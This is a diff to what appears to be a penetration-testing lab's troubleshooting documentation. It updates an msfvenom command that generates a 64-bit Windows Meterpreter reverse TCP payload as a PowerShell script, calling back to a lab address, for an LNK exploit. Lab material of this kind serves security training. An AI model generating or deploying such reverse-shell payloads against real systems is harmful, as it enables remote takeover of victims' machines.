@@ -456,9 +456,11 @@ cd /vagrant/vagrant/provisioning/kali
 **PowerShell payload missing:**
 ```bash
 # Generate manually
-msfvenom -p windows/meterpreter/reverse_tcp \
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
     LHOST=192.168.56.101 \
     LPORT=4444 \
+    -a x64 \
+    --platform windows \
     -f psh \
     -o /vagrant/exploits/lnk/shell.ps1
 ```
